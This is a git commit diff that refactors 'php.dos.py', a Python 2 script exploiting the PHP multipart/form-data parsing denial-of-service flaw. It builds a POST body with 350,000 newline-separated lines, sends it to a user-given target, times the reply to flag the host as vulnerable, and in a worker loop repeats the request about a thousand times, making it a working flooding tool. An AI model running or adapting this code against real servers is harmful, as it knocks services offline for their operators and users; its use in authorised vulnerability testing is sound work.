b542f0492ab56d73d4cbc77e97b5edc2227239b8
zhijie <zhijie@mogujie.com>
2015-05-22 10:52:45 +0800

    Improves

--- php.dos.py
+++ php.dos.py
@@ -1,45 +1,40 @@
 #!/usr/bin/env python
 
-import sys
-import urllib, urllib2
+import urllib2
 import datetime
 from optparse import OptionParser
-import threading
 import multiprocessing
 
-
-def http_proxy(proxy_url):
-    proxy_handler = urllib2.ProxyHandler({"http": proxy_url})
-    null_proxy_handler = urllib2.ProxyHandler({})
-    opener = urllib2.build_opener(proxy_handler)
-    urllib2.install_opener(opener)
-
-
-# end http_proxy
 
 def check_php_multipartform_dos(url, post_body, headers):
     req = urllib2.Request(url)
     for key in headers.keys():
         req.add_header(key, headers[key])
-    starttime = datetime.datetime.now();
+    start_time = datetime.datetime.now()
     fd = urllib2.urlopen(req, post_body)
-    html = fd.read()
-    endtime = datetime.datetime.now()
-    usetime = (endtime - starttime).seconds
-    if (usetime > 5):
-        result = url + " is vulnerable";
+    print fd.getcode()
+    end_time = datetime.datetime.now()
+    use_time = (end_time - start_time).seconds
+    result = ''
+    if use_time > 5:
+        result = url + " is vulnerable"
     else:
-        if (usetime > 3):
+        if use_time > 3:
             result = "need to check normal respond time"
-    return [result, usetime]
+    return [result, use_time]
 
 
 # end
 
 # worker function
 def worker():
-    for i in range(1000):
+    x = 0
+    while True:
+        if x > 1000:
+            exit(0)
+        print x
         attack()
+        x += 1
 
 
 def attack():
@@ -50,26 +45,26 @@ def attack():
                       type="string",
                       help="test target")
     (options, args) = parser.parse_args()
-    if (options.target):
+    if options.target:
         target = options.target
     else:
-        return;
+        return
 
-    Num = 350000
+    count = 350000
     headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
                'Accept-Encoding': 'gzip, deflate',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36'}
     body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=sp.jpg"
     payload = ""
-    for i in range(0, Num):
-        payload = payload + "a\n"
-    body = body + payload;
-    body = body + "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
-    print "starting...";
+    for x in range(count):
+        payload += "a\n"
+    body += payload
+    body += "Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
+    print "starting..."
     respond = check_php_multipartform_dos(target, body, headers)
     print "Result : "
     print respond[0]
-    print "Respond time : " + str(respond[1]) + " seconds";
+    print "Respond time : " + str(respond[1]) + " seconds"
 
 
 if __name__ == "__main__":
